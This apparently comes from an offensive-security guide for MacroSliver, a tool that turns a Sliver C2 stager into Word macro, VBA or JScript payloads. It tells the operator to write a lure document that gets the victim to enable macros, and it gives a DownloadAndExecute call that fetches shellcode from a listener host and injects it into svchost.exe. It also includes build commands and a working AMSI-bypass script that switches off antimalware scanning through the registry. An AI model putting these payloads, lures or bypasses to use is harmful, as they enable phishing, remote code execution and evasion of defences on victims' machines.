# Macro Sliver

## Reference
https://github.com/Cyb3rDudu/MacroSliver

### Macro Usage
The file `macrosliver.vba` contains the VBA code that is directly usable in Word. Create a `.docm` file with convincing text to prompt the victim to enable macro execution, ensuring that the `Run()` function is triggered, for example, by calling it in the `Auto_Open()` trigger or a similar method, to catch the session with the instantiated listener. When the VBA function is executed, it deserializes the embedded stager DLL and invokes it. After that, the functions of the loader class can be called using the object `o`.
```VBA
    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
    o.DownloadAndExecute "https://192.168.45.227:8064/hello.woff", "svchost.exe", "deflate9", "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT", "8y/B?E(G+KbPeShV"
```
The arguments to pass are:
1. The stage listener URL where the shellcode is hosted.
2. The binary into which the process should be injected.
3. The compression algorithm: either `deflate9`, `gzip`, or an empty string if no compression was chosen when the listener was created.
4. The AES key.
5. The AES initialization vector.

## Build the assembly

The assembly can also be built by yourself if additional functionality is needed or if further obfuscation and AMSI bypass are required. To do this, open the solution file and build the integrated MacroSliver Project. It has to be built for the Any CPU configuration and does not need to be specified for a particular architecture. This allows the stage listener to provide the correct architecture for the target Office version.

The changes to the original stager include the handling of decompression in .NET v2 compared to .NET v4 and the AES decryption class. Additionally, VBA passes all parameters as strings rather than byte arrays, as in the original stager. So the aes key and iv are passed as strings.

After the assembly has been built, it can be used to create a VBA, HTA, or JScript script with DotNetToJScript.

## Create the Script
To generate the VBA script using DotNetToJScript, follow these steps:

1. Build DotNetToJScript: Clone and build the DotNetToJScript project from (GitHub)[https://github.com/tyranid/DotNetToJScript].
2. Prepare the necessary files: Copy the DotNetToJScript.exe, NDesk.Options.dll (created during the build process), and MacroSliver.dll into the same folder.
3. Execute the command: Run the following command to generate the VBA script.

Here are the detailed steps:

### Step 1: Build DotNetToJScript
1. Clone the DotNetToJScript repository:
```bash
git clone https://github.com/tyranid/DotNetToJScript.git
```
2. Navigate to the DotNetToJScript directory and build the project:
```bash
cd DotNetToJScript
msbuild /p:Configuration=Release
```
### Step 2: Prepare the Files
1. Copy `DotNetToJScript.exe` and `NDesk.Options.dll` from the build output directory (usually `bin\Release`) to a new folder.
2. Copy your `MacroSliver.dll` to the same folder.
### Step 3: Execute the Command
1. Open a command prompt in the folder containing `DotNetToJScript.exe`, `NDesk.Options.dll`, and `MacroSliver.dll`.
2. Run the following command to generate the VBA script:
```
.\DotNetToJScript.exe .\MacroSliver.dll --lang=vba --ver=v2 -c=Loader -o macrosliver.vba
```
This command will create a `macrosliver.vba` file that contains the VBA script generated from the `MacroSliver.dll`.
Finally add the call of `DownloadAndExecute` to trigger the stager instantiation.
```VBA
    o.DownloadAndExecute "https://192.168.X.X:8064/hello.woff", "svchost.exe", "deflate9", "D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT", "8y/B?E(G+KbPeShV"
```

## JScript

You can also create JScript payloads to deliver the dll via java script. Follow allong but transfer the methodolgy to JS. I believe you are smart enough to figure out how to do.

### AMSI Bypass

Bypassing AMSI highly reduces the detection rate, but DN2JS doesn't provide one natively. So, you can add the below AMSI bypass to your output JScript payloads much like I've done to the examples I've included in this repo.

> NOTE: You must do the bypass **after** the `setversion()` method runs or your payload will break.
> Credit: [rxwx/bypass.js](https://gist.github.com/rxwx/8955e5abf18dc258fd6b43a3a7f4dbf9) (*although its a pretty well-known bypass*)
{% code overflow="wrap" %}
```js
// 4MS7_BYP455
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";

try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, '');
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD"); // neuter AMSI
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); // blocking call to Run()
	sh.RegWrite(key, 1, "REG_DWORD"); // put it back
	WScript.Quit(1);
}
```
{% endcode %}

Sometimes the AMSI bypass itself is what gets your payload flagged so feel free to play around with it.
